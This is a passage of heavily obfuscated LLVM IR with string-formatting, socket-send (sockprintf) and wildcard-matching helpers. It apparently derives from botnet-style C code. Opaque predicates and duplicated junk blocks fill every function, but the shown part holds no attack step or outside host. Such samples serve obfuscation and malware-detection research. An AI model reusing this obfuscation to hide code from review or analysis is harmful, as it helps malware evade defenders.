  store i32 %2, i32* %186, align 4
  store i32 %3, i32* %187, align 4
  store i32 0, i32* %188, align 4
  store i32 32, i32* %189, align 4
  %192 = load i32, i32* %186, align 4
  %193 = icmp sgt i32 %192, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %43
  %194 = load i32, i32* %19, align 4
  %195 = load i32, i32* %15, align 4
  %196 = icmp sge i32 %194, %195
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %63
  store i32 0, i32* %15, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %88
  store i32 48, i32* %18, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %138
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %158
  %197 = load i8**, i8*** %13, align 8
  %198 = load i32, i32* %18, align 4
  call void @printchar(i8** %197, i32 %198)
  %199 = load i32, i32* %17, align 4
  %_ = sub i32 %199, 1
  %gen = mul i32 %_, 1
  %_19 = sub i32 0, %199
  %gen20 = add i32 %_19, 1
  %_21 = sub i32 %199, 1
  %gen22 = mul i32 %_21, 1
  %_23 = sub i32 0, %199
  %gen24 = add i32 %_23, 1
  %200 = add nsw i32 %199, 1
  store i32 %200, i32* %17, align 4
  br label %originalBB18
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %262

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %77

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* @x.33
  %38 = load i32, i32* @y.34
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %36
  %45 = load i32, i32* %11, align 4
  %46 = icmp eq i32 %45, 10
  %47 = load i32, i32* @x.33
  %48 = load i32, i32* @y.34
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %46, label %55, label %77

; <label>:55:                                     ; preds = %originalBBpart2
  %56 = load i32, i32* %10, align 4
  %57 = icmp slt i32 %56, 0
  br i1 %57, label %58, label %77

; <label>:58:                                     ; preds = %55
  %59 = load i32, i32* @x.33
  %60 = load i32, i32* @y.34
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %58
  store i32 1, i32* %19, align 4
  %67 = load i32, i32* %10, align 4
  %68 = sub nsw i32 0, %67
  store i32 %68, i32* %21, align 4
  %69 = load i32, i32* @x.33
  %70 = load i32, i32* @y.34
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %77

; <label>:77:                                     ; preds = %originalBBpart24, %55, %originalBBpart2, %33
  %78 = load i32, i32* @x.33
  %79 = load i32, i32* @y.34
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %77
  %86 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %87 = getelementptr inbounds i8, i8* %86, i64 12
  %88 = getelementptr inbounds i8, i8* %87, i64 -1
  store i8* %88, i8** %17, align 8
  %89 = load i8*, i8** %17, align 8
  store i8 0, i8* %89, align 1
  %90 = load i32, i32* @x.33
  %91 = load i32, i32* @y.34
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %98

; <label>:98:                                     ; preds = %originalBBpart240, %originalBBpart28
  %99 = load i32, i32* %21, align 4
  %100 = icmp ne i32 %99, 0
  br i1 %100, label %101, label %154

; <label>:101:                                    ; preds = %98
  %102 = load i32, i32* @x.33
  %103 = load i32, i32* @y.34
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %101
  %110 = load i32, i32* %21, align 4
  %111 = load i32, i32* %11, align 4
  %112 = urem i32 %110, %111
  store i32 %112, i32* %18, align 4
  %113 = load i32, i32* %18, align 4
  %114 = icmp sge i32 %113, 10
  %115 = load i32, i32* @x.33
  %116 = load i32, i32* @y.34
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBBpart219, label %originalBB10alteredBB

originalBBpart219:                                ; preds = %originalBB10
  br i1 %114, label %123, label %129

; <label>:123:                                    ; preds = %originalBBpart219
  %124 = load i32, i32* %15, align 4
  %125 = sub nsw i32 %124, 48
  %126 = sub nsw i32 %125, 10
  %127 = load i32, i32* %18, align 4
  %128 = add nsw i32 %127, %126
  store i32 %128, i32* %18, align 4
  br label %129

; <label>:129:                                    ; preds = %123, %originalBBpart219
  %130 = load i32, i32* @x.33
  %131 = load i32, i32* @y.34
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %129
  %138 = load i32, i32* %18, align 4
  %139 = add nsw i32 %138, 48
  %140 = trunc i32 %139 to i8
  %141 = load i8*, i8** %17, align 8
  %142 = getelementptr inbounds i8, i8* %141, i32 -1
  store i8* %142, i8** %17, align 8
  store i8 %140, i8* %142, align 1
  %143 = load i32, i32* %11, align 4
  %144 = load i32, i32* %21, align 4
  %145 = udiv i32 %144, %143
  store i32 %145, i32* %21, align 4
  %146 = load i32, i32* @x.33
  %147 = load i32, i32* @y.34
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBBpart240, label %originalBB21alteredBB

originalBBpart240:                                ; preds = %originalBB21
  br label %98

; <label>:154:                                    ; preds = %98
  %155 = load i32, i32* @x.33
  %156 = load i32, i32* @y.34
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %154
  %163 = load i32, i32* %19, align 4
  %164 = icmp ne i32 %163, 0
  %165 = load i32, i32* @x.33
  %166 = load i32, i32* @y.34
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %164, label %173, label %254

; <label>:173:                                    ; preds = %originalBBpart244
  %174 = load i32, i32* @x.33
  %175 = load i32, i32* @y.34
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %173
  %182 = load i32, i32* %13, align 4
  %183 = icmp ne i32 %182, 0
  %184 = load i32, i32* @x.33
  %185 = load i32, i32* @y.34
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %183, label %192, label %234

; <label>:192:                                    ; preds = %originalBBpart248
  %193 = load i32, i32* @x.33
  %194 = load i32, i32* @y.34
  %195 = sub i32 %193, 1
  %196 = mul i32 %193, %195
  %197 = urem i32 %196, 2
  %198 = icmp eq i32 %197, 0
  %199 = icmp slt i32 %194, 10
  %200 = or i1 %198, %199
  br i1 %200, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %192
  %201 = load i32, i32* %14, align 4
  %202 = and i32 %201, 2
  %203 = icmp ne i32 %202, 0
  %204 = load i32, i32* @x.33
  %205 = load i32, i32* @y.34
  %206 = sub i32 %204, 1
  %207 = mul i32 %204, %206
  %208 = urem i32 %207, 2
  %209 = icmp eq i32 %208, 0
  %210 = icmp slt i32 %205, 10
  %211 = or i1 %209, %210
  br i1 %211, label %originalBBpart259, label %originalBB50alteredBB

originalBBpart259:                                ; preds = %originalBB50
  br i1 %203, label %212, label %234

; <label>:212:                                    ; preds = %originalBBpart259
  %213 = load i32, i32* @x.33
  %214 = load i32, i32* @y.34
  %215 = sub i32 %213, 1
  %216 = mul i32 %213, %215
  %217 = urem i32 %216, 2
  %218 = icmp eq i32 %217, 0
  %219 = icmp slt i32 %214, 10
  %220 = or i1 %218, %219
  br i1 %220, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %212
  %221 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %221, i32 45)
  %222 = load i32, i32* %20, align 4
  %223 = add nsw i32 %222, 1
  store i32 %223, i32* %20, align 4
  %224 = load i32, i32* %13, align 4
  %225 = add nsw i32 %224, -1
  store i32 %225, i32* %13, align 4
  %226 = load i32, i32* @x.33
  %227 = load i32, i32* @y.34
  %228 = sub i32 %226, 1
  %229 = mul i32 %226, %228
  %230 = urem i32 %229, 2
  %231 = icmp eq i32 %230, 0
  %232 = icmp slt i32 %227, 10
  %233 = or i1 %231, %232
  br i1 %233, label %originalBBpart273, label %originalBB61alteredBB

originalBBpart273:                                ; preds = %originalBB61
  br label %237

; <label>:234:                                    ; preds = %originalBBpart259, %originalBBpart248
  %235 = load i8*, i8** %17, align 8
  %236 = getelementptr inbounds i8, i8* %235, i32 -1
  store i8* %236, i8** %17, align 8
  store i8 45, i8* %236, align 1
  br label %237

; <label>:237:                                    ; preds = %234, %originalBBpart273
  %238 = load i32, i32* @x.33
  %239 = load i32, i32* @y.34
  %240 = sub i32 %238, 1
  %241 = mul i32 %238, %240
  %242 = urem i32 %241, 2
  %243 = icmp eq i32 %242, 0
  %244 = icmp slt i32 %239, 10
  %245 = or i1 %243, %244
  br i1 %245, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %237
  %246 = load i32, i32* @x.33
  %247 = load i32, i32* @y.34
  %248 = sub i32 %246, 1
  %249 = mul i32 %246, %248
  %250 = urem i32 %249, 2
  %251 = icmp eq i32 %250, 0
  %252 = icmp slt i32 %247, 10
  %253 = or i1 %251, %252
  br i1 %253, label %originalBBpart277, label %originalBB75alteredBB

originalBBpart277:                                ; preds = %originalBB75
  br label %254

; <label>:254:                                    ; preds = %originalBBpart277, %originalBBpart244
  %255 = load i32, i32* %20, align 4
  %256 = load i8**, i8*** %9, align 8
  %257 = load i8*, i8** %17, align 8
  %258 = load i32, i32* %13, align 4
  %259 = load i32, i32* %14, align 4
  %260 = call i32 @prints(i8** %256, i8* %257, i32 %258, i32 %259)
  %261 = add nsw i32 %255, %260
  store i32 %261, i32* %8, align 4
  br label %262

; <label>:262:                                    ; preds = %254, %25
  %263 = load i32, i32* %8, align 4
  ret i32 %263

originalBBalteredBB:                              ; preds = %originalBB, %36
  %264 = load i32, i32* %11, align 4
  %265 = icmp eq i32 %264, 10
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %58
  store i32 1, i32* %19, align 4
  %266 = load i32, i32* %10, align 4
  %267 = sub nsw i32 0, %266
  store i32 %267, i32* %21, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %77
  %268 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %269 = getelementptr inbounds i8, i8* %268, i64 12
  %270 = getelementptr inbounds i8, i8* %269, i64 -1
  store i8* %270, i8** %17, align 8
  %271 = load i8*, i8** %17, align 8
  store i8 0, i8* %271, align 1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %101
  %272 = load i32, i32* %21, align 4
  %273 = load i32, i32* %11, align 4
  %_ = sub i32 %272, %273
  %gen = mul i32 %_, %273
  %_11 = shl i32 %272, %273
  %_12 = shl i32 %272, %273
  %_13 = shl i32 %272, %273
  %_14 = sub i32 0, %272
  %gen15 = add i32 %_14, %273
  %_16 = sub i32 %272, %273
  %gen17 = mul i32 %_16, %273
  %274 = urem i32 %272, %273
  store i32 %274, i32* %18, align 4
  %275 = load i32, i32* %18, align 4
  %276 = icmp sge i32 %275, 10
  br label %originalBB10

originalBB21alteredBB:                            ; preds = %originalBB21, %129
  %277 = load i32, i32* %18, align 4
  %_22 = sub i32 %277, 48
  %gen23 = mul i32 %_22, 48
  %_24 = sub i32 %277, 48
  %gen25 = mul i32 %_24, 48
  %278 = add nsw i32 %277, 48
  %279 = trunc i32 %278 to i8
  %280 = load i8*, i8** %17, align 8
  %281 = getelementptr inbounds i8, i8* %280, i32 -1
  store i8* %281, i8** %17, align 8
  store i8 %279, i8* %281, align 1
  %282 = load i32, i32* %11, align 4
  %283 = load i32, i32* %21, align 4
  %_26 = shl i32 %283, %282
  %_27 = sub i32 0, %283
  %gen28 = add i32 %_27, %282
  %_29 = sub i32 0, %283
  %gen30 = add i32 %_29, %282
  %_31 = sub i32 %283, %282
  %gen32 = mul i32 %_31, %282
  %_33 = sub i32 %283, %282
  %gen34 = mul i32 %_33, %282
  %_35 = sub i32 0, %283
  %gen36 = add i32 %_35, %282
  %_37 = sub i32 0, %283
  %gen38 = add i32 %_37, %282
  %284 = udiv i32 %283, %282
  store i32 %284, i32* %21, align 4
  br label %originalBB21

originalBB42alteredBB:                            ; preds = %originalBB42, %154
  %285 = load i32, i32* %19, align 4
  %286 = icmp ne i32 %285, 0
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %173
  %287 = load i32, i32* %13, align 4
  %288 = icmp ne i32 %287, 0
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %192
  %289 = load i32, i32* %14, align 4
  %_51 = shl i32 %289, 2
  %_52 = sub i32 0, %289
  %gen53 = add i32 %_52, 2
  %_54 = sub i32 %289, 2
  %gen55 = mul i32 %_54, 2
  %_56 = shl i32 %289, 2
  %_57 = shl i32 %289, 2
  %290 = and i32 %289, 2
  %291 = icmp ne i32 %290, 0
  br label %originalBB50

originalBB61alteredBB:                            ; preds = %originalBB61, %212
  %292 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %292, i32 45)
  %293 = load i32, i32* %20, align 4
  %_62 = sub i32 0, %293
  %gen63 = add i32 %_62, 1
  %_64 = sub i32 0, %293
  %gen65 = add i32 %_64, 1
  %_66 = sub i32 %293, 1
  %gen67 = mul i32 %_66, 1
  %_68 = sub i32 0, %293
  %gen69 = add i32 %_68, 1
  %294 = add nsw i32 %293, 1
  store i32 %294, i32* %20, align 4
  %295 = load i32, i32* %13, align 4
  %_70 = sub i32 %295, -1
  %gen71 = mul i32 %_70, -1
  %296 = add nsw i32 %295, -1
  store i32 %296, i32* %13, align 4
  br label %originalBB61

originalBB75alteredBB:                            ; preds = %originalBB75, %237
  br label %originalBB75
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %31

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* @x.35
  %9 = load i32, i32* @y.36
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = load i32, i32* %4, align 4
  %17 = trunc i32 %16 to i8
  %18 = load i8**, i8*** %3, align 8
  %19 = load i8*, i8** %18, align 8
  store i8 %17, i8* %19, align 1
  %20 = load i8**, i8*** %3, align 8
  %21 = load i8*, i8** %20, align 8
  %22 = getelementptr inbounds i8, i8* %21, i32 1
  store i8* %22, i8** %20, align 8
  %23 = load i32, i32* @x.35
  %24 = load i32, i32* @y.36
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:31:                                     ; preds = %2
  %32 = bitcast i32* %4 to i8*
  %33 = call i64 @write(i32 1, i8* %32, i64 1)
  br label %34

; <label>:34:                                     ; preds = %31, %originalBBpart2
  %35 = load i32, i32* @x.35
  %36 = load i32, i32* @y.36
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %34
  %43 = load i32, i32* @x.35
  %44 = load i32, i32* @y.36
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %7
  %51 = load i32, i32* %4, align 4
  %52 = trunc i32 %51 to i8
  %53 = load i8**, i8*** %3, align 8
  %54 = load i8*, i8** %53, align 8
  store i8 %52, i8* %54, align 1
  %55 = load i8**, i8*** %3, align 8
  %56 = load i8*, i8** %55, align 8
  %57 = getelementptr inbounds i8, i8* %56, i32 1
  store i8* %57, i8** %55, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %34
  br label %originalBB1
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #5

declare i64 @write(i32, i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #5
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #9
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.485, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #9
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #5
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = load i32, i32* @x.41
  %4 = load i32, i32* @y.42
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  store i8* %0, i8** %12, align 8
  store i8* %1, i8** %13, align 8
  %14 = load i8*, i8** %12, align 8
  %15 = load i8, i8* %14, align 1
  %16 = zext i8 %15 to i32
  %17 = load i32, i32* @x.41
  %18 = load i32, i32* @y.42
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  switch i32 %16, label %134 [
    i32 0, label %25
    i32 42, label %29
    i32 63, label %85
  ]

; <label>:25:                                     ; preds = %originalBBpart2
  %26 = load i8*, i8** %13, align 8
  %27 = load i8, i8* %26, align 1
  %28 = zext i8 %27 to i32
  store i32 %28, i32* %11, align 4
  br label %156

; <label>:29:                                     ; preds = %originalBBpart2
  %30 = load i8*, i8** %12, align 8
  %31 = getelementptr inbounds i8, i8* %30, i64 1
  %32 = load i8*, i8** %13, align 8
  %33 = call i32 @wildString(i8* %31, i8* %32)
  %34 = icmp ne i32 %33, 0
  br i1 %34, label %35, label %65

; <label>:35:                                     ; preds = %29
  %36 = load i32, i32* @x.41
  %37 = load i32, i32* @y.42
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %35
  %44 = load i8*, i8** %13, align 8
  %45 = load i8, i8* %44, align 1
  %46 = zext i8 %45 to i32
  %47 = icmp ne i32 %46, 0
  %48 = load i32, i32* @x.41
  %49 = load i32, i32* @y.42
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %47, label %56, label %63

; <label>:56:                                     ; preds = %originalBBpart24
  %57 = load i8*, i8** %12, align 8
  %58 = load i8*, i8** %13, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 1
  %60 = call i32 @wildString(i8* %57, i8* %59)
  %61 = icmp ne i32 %60, 0
  %62 = xor i1 %61, true
  br label %63

; <label>:63:                                     ; preds = %56, %originalBBpart24
  %64 = phi i1 [ false, %originalBBpart24 ], [ %62, %56 ]
  br label %65

; <label>:65:                                     ; preds = %63, %29
  %66 = phi i1 [ true, %29 ], [ %64, %63 ]
  %67 = load i32, i32* @x.41
  %68 = load i32, i32* @y.42
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %65
  %75 = xor i1 %66, true
  %76 = zext i1 %75 to i32
  store i32 %76, i32* %11, align 4
  %77 = load i32, i32* @x.41
  %78 = load i32, i32* @y.42
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart210, label %originalBB6alteredBB

originalBBpart210:                                ; preds = %originalBB6
  br label %156

; <label>:85:                                     ; preds = %originalBBpart2
  %86 = load i32, i32* @x.41
  %87 = load i32, i32* @y.42
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %85
  %94 = load i8*, i8** %13, align 8
  %95 = load i8, i8* %94, align 1
  %96 = zext i8 %95 to i32
  %97 = icmp ne i32 %96, 0
  %98 = load i32, i32* @x.41
  %99 = load i32, i32* @y.42
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart214, label %originalBB12alteredBB

originalBBpart214:                                ; preds = %originalBB12
  br i1 %97, label %106, label %114

; <label>:106:                                    ; preds = %originalBBpart214
  %107 = load i8*, i8** %12, align 8
  %108 = getelementptr inbounds i8, i8* %107, i64 1
  %109 = load i8*, i8** %13, align 8
